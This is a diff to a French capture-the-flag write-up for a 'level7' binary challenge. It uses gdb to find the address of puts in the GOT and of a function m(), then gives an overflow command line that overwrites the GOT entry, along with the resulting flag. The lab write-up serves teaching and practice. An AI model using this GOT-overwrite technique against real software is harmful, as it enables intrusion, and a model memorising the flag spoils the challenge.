@@ -180,4 +180,33 @@ strcpy(0x6c4c6b4b, "test2" <unfinished ...>
 
 ```
 
-On trouve un offset qui commence a **20**
+On trouve un offset a **20**.
+
+On va overflow le premier argument avec l'adresse de puts dans le GOT pour mettre ensuite l'adresse de `m()` dans le second. Pour ce faire on va chercher l'adresse de puts dans le GOT.
+
+```
+:~$ gdb level7
+...
+
+(gdb) disas main
+(...)
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+
+(gdb) disas 0x8048400
+(...)
+   0x08048400 <+0>:     jmp    *0x8049928
+
+(gdb) x 0x8049928
+   0x8049928 <puts@got.plt>:       0x08048406
+
+```
+
+On a donc l'adresse de puts dans le GOT avec `0x8049928` et l'adresse de `m()` avec `0x080484f4`
+
+Ce qui nous donne:
+
+```
+:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1714139906
+```
